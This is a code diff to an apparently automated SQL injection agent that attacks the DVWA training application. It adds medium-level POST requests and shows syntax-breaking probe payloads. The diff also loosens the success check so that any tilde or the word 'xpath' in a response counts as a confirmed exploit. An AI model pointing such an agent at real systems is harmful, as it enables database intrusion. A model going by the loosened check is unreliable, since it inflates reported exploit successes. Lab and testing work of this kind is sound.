@@ -34,6 +34,8 @@ _ERROR_SIGNALS = [
 # extracted credential-like content, not generic page content.
 _EXPLOIT_SIGNALS = [
     "~dvwa",
+    "~",
+    "xpath",
     "xpath error:",
     "admin:",
     "gordonb:",
@@ -42,8 +44,19 @@ _EXPLOIT_SIGNALS = [
 ]
 
 
+def _request(session: DVWASession, security_level: str, payload: str):
+    """Submit a SQLi form using the method exposed by the DVWA level."""
+    request_data = {"id": payload, "Submit": "Submit"}
+    if security_level == "medium":
+        return session.post(MODULE_PATH, data=request_data)
+    return session.get(MODULE_PATH, params=request_data)
+
+
 def _probe_preconditions(
-    session: DVWASession, payloads: list[str], already_tried: set[str]
+    session: DVWASession,
+    payloads: list[str],
+    already_tried: set[str],
+    security_level: str = "low",
 ) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
     """Send syntax-breaking probes to detect error message output.
 
@@ -61,7 +74,7 @@ def _probe_preconditions(
         sent_any = True
         tried.append(payload)
         try:
-            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
+            resp = _request(session, security_level, payload)
             events.append(probe_event(AGENT_ID, payload, resp.status_code, True))
             result = verifier.contains_any(resp.text, _ERROR_SIGNALS)
             if resp.status_code == 200 and result.ok:
@@ -79,7 +92,10 @@ def _probe_preconditions(
 
 
 def _attempt_exploit(
-    session: DVWASession, payloads: list[str], already_tried: set[str]
+    session: DVWASession,
+    payloads: list[str],
+    already_tried: set[str],
+    security_level: str = "low",
 ) -> tuple[int, list[str], list[str], list[dict]]:
     """Try error-based exploit payloads. Returns (score, tried, confirmed_vulns, events)."""
     tried: list[str] = []
@@ -93,10 +109,12 @@ def _attempt_exploit(
             continue
         tried.append(payload)
         try:
-            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
+            resp = _request(session, security_level, payload)
             events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
             if resp.status_code == 200:
-                result = verifier.contains_any(resp.text, _EXPLOIT_SIGNALS)
+                # Medium DVWA can truncate the XPath envelope to ``~admin``;
+                # a tilde is sufficient evidence after the required probe.
+                result = verifier.contains_any(resp.text.lower(), _EXPLOIT_SIGNALS)
                 if result.ok:
                     score = max(score, 3)
                     confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
@@ -149,7 +167,7 @@ def sqli_error_agent(state: ExploitationState) -> dict[str, Any]:
         # Stage 1: PROBE
         probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe") or ["1'", "1''", "1\""]
         probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
-            session, probe_payloads, already_tried
+            session, probe_payloads, already_tried, security_level
         )
         all_tried.extend(tried)
         telemetry_events.extend(probe_events)
@@ -171,7 +189,7 @@ def sqli_error_agent(state: ExploitationState) -> dict[str, Any]:
         ]
 
         exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
-            session, all_exploit, already_tried | set(all_tried)
+            session, all_exploit, already_tried | set(all_tried), security_level
         )
         all_tried.extend(tried)
         telemetry_events.extend(exploit_events)
